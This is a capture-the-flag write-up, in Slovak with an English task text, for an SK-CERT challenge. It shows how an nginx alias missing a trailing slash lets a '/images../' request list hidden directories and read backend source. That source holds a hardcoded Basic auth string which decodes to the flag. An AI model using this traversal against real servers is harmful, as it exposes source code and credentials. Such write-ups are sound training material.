# Zadanie

EN: We are suspecting that the website on [http://exp.cybergame.sk:7000/](http://exp.cybergame.sk:7000/) is hiding something. We need to find out what is hidden in the website. We've gathered what seems to be a proxy configuration file from our trusted source.

SK: Podozrieva sa, že webová stránka na adrese [http://exp.cybergame.sk:7000/](http://exp.cybergame.sk:7000/) niečo skrýva. Potrebujeme zistiť, čo je na tejto stránke skryté. Od nášho spoľahlivého zdroja sme získali čosi, čo sa javí ako konfiguračný súbor proxy.

**Súbory**

- nginx.conf

## Riešenie

```nginx
events {
    worker_connections 1024;
}

http {
    include mime.types;

    server {
        listen 80;
        server_name localhost;

        root /app/src/html/;
        index index.html;


        location /images {
            alias /app/src/images/;
            autoindex on;
        }

        location /ponies/ {
            alias /app/src/ponies/;
        }

        location /resources/ {
            alias /app/src/resources/;
        }

        location /secretbackend/ {
            proxy_pass http://secretbackend:3000/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

Prvé, čo nám bije do očí sú dve veci, route secretbackend  a autoindex na /images. Secretbackend pýta heslo, to nemáme, skúsime pozrieť route-u /images

Zaujímavéje , že keď otvorím `http://exp.cybergame.sk:7000/images` ako je route v confe, tak ma vráti na samotnú stránku, ale keď otvorím `http://exp.cybergame.sk:7000/images/` s lomítkom, tak bez problémov dostanem indexovaný priečinok images... skúsim path traverse `....../images/..` alebo `....../images/../` neúspech.. Ale podľa confu nám lomítko doplní aj keď ho nedáme, otvoríme teda `....../images../`

A máme výpis priečinka nad images

```
Index of /images../
../
html/                                              05-Mar-2025 11:54                   -
images/                                            05-Mar-2025 10:10                   -
ponies/                                            05-Mar-2025 10:05                   -
resources/                                         05-Mar-2025 10:07                   -
secretbackend/                                     31-Mar-2025 19:22                   -
```

A rovno aj obsah pričinka secretbackend

```
Index of /images../secretbackend/
../
public/                                            05-Mar-2025 10:23                   -
db.js                                              31-Mar-2025 19:21                3825
index.js                                           18-Mar-2025 12:26                4348
jwt.js                                             13-Mar-2025 15:13                 895
package-lock.json                                  13-Mar-2025 13:03               99556
package.json                                       13-Mar-2025 13:03                 457
```

na public sa bez hesla nedostane, tam je už index.html, ktorý nám zobrazuje stránku secretbackendu, ale je chránený heslom.. Pozrieme obsah súboru index.js.. 

index.js obsahuje auth string, 

```javascript
app.use((req, res, next) => {
  if (
    req.headers.authorization !==
    "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9"
  ) {
    res.setHeader("WWW-Authenticate", 'Basic realm="Secure Stable Area"');
    return res.status(401).send("Unauthorized");
  }
  next();
});
```

ktorý by mal v base64 obsahovať meno heslo, dekódujeme a dostaneme

```
pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}

user:pr1ncess
pass:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}
```

## Vlajka

```
SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}
```
